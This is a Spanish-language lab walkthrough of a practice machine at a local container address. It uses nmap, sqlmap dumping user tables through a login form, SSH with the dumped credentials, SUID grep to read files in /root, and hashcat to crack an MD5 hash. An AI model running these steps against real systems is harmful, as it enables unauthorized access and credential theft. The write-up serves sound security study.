Comienzo haciendo Nmap:
```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

![](Imágenes/Pasted%20image%2020240921142724.png)

En la página veo un enlace a un formulario de login. Pruebo a hacer sqlinjection y me sale el siguiente mensaje: 
![](Imágenes/Pasted%20image%2020240921143038.png)

Voy a probar a utilizar una herramienta automatizada: 
```bash
sqlmap -u "http://172.17.0.2/login.html" --forms --batch --dump
```
- Con `forms` se prueban los formularios en la url objetivo. 
- Con `batch` usamos el comportamiento predeterminado.
- Con `dump` obtenemos los contenidos de las tablas.

Obtengo los siguientes usuarios:
![](Imágenes/Pasted%20image%2020240921151059.png)

Estos usuarios no sirven para nada en la página web, así que miro por ssh. Con las credenciales de pepe obtengo acceso. 

Como no puedo usar sudo -l, compruebo qué ficheros con el bit SUID activado hay:
```bash
find / -perm -4000 -user root 2>/dev/null
```


![](Imágenes/Pasted%20image%2020240921151711.png)

Con ls compruebo los archivos en /root: 
![](Imágenes/Pasted%20image%2020240921151756.png)

Con [grep](https://gtfobins.github.io/gtfobins/grep/#suid) podré ver el contenido del mismo:
![](Imágenes/Pasted%20image%2020240921151842.png)

Utilizo hashcat para romper el hash: 
```bash
hashcat -m 0 -a 0 "e43833c4c9d5ac444e16bb94715a75e4" /usr/share/wordlists/rockyou.txt 
```

Obteniendo: 
![](Imágenes/Pasted%20image%2020240921152404.png)

![](Imágenes/Pasted%20image%2020240921152430.png)